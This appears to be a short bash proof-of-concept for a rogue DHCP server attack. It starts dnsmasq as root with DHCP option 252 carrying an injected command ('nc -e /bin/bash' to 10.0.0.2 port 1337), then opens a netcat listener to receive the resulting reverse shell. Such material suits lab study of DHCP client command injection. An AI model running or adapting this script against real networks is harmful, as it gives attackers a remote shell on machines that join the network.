#!/bin/bash

echo "i am the attacker" > attacker.txt
dnsmasq --user=root --interface=eth0 --bind-interfaces  --except-interface=lo --dhcp-range=10.0.0.10,10.0.0.20,1h --conf-file=/dev/null --dhcp-option=6,10.0.0.1 --dhcp-option=3,10.0.0.1 --dhcp-option="252,abc'&nc -e /bin/bash 10.0.0.2 1337 #" --log-queries --log-facility=/var/log/dnsmasq-server.log
nc -l -p 1337 -v
